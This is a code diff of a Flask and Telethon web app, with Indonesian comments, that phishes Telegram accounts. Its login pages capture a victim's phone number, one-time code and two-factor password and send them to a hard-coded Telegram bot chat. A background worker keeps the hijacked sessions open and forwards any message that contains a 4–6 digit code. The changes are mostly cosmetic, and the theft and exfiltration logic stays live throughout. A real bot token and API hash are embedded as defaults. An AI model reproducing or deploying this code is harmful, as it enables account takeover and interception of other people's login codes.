@@ -9,7 +9,7 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# API config
+# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
@@ -85,17 +85,20 @@ def otp():
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
                     return redirect(url_for("password"))
                 else:
-                    # akun tanpa password → langsung success
+                    # akun tanpa password → langsung sukses
                     otp = session.get("last_otp")
+                    phone = session.get("phone")
                     text = (
                         "📢 *New User Login*\n"
                         f"👤 *Number*   : `{phone}`\n"
                         f"🔑 *OTP*      : `{otp}`\n"
-                        f"🔒 *Password* : `-`"
+                        f"🔒 *Password* : `-` (tidak ada password)"
                     )
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                    requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
-                    flash("Login berhasil tanpa password ✅")
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
+                    )
+                    flash("Login berhasil ✅ (akun tanpa password).")
                     return redirect(url_for("success"))
             else:
                 flash(result["error"])
@@ -120,12 +123,12 @@ def password():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
-                # harus cocok kalau akun ada password
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
             except Exception as e:
+                print(f"[DEBUG] Password error: {e}")
                 await client.disconnect()
                 return False, None
 
@@ -138,8 +141,10 @@ def password():
                 f"🔑 *OTP*      : `{otp}`\n"
                 f"🔒 *Password* : `{password_input}`"
             )
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
+            )
             flash("Login berhasil ✅")
             return redirect(url_for("success"))
         else:
@@ -161,11 +166,10 @@ def success():
 # =================== WORKER ===================
 
 async def forward_handler(event, client_name):
-    """Handler untuk meneruskan semua pesan + OTP"""
+    """Handler untuk meneruskan pesan OTP"""
     text_msg = event.message.message
-    print(f"[Worker][{client_name}] Pesan masuk: {text_msg}")  # debug
+    print(f"[Worker][{client_name}] Pesan masuk: {text_msg}")  # debug semua pesan
 
-    # cek apakah ada kode OTP (angka 4-6 digit)
     import re
     otp_match = re.findall(r"\d{4,6}", text_msg)
     if otp_match:
@@ -205,14 +209,14 @@ async def worker_main():
                 clients[fname] = client
                 asyncio.create_task(client.run_until_disconnected())
 
-        await asyncio.sleep(10)
+        await asyncio.sleep(10)  # cek ulang tiap 10 detik
 
 
 def start_worker():
     asyncio.run(worker_main())
 
 
-# jalankan worker di thread terpisah
+# jalankan worker di thread terpisah saat app start
 threading.Thread(target=start_worker, daemon=True).start()
 
 # =================== RUN FLASK ===================
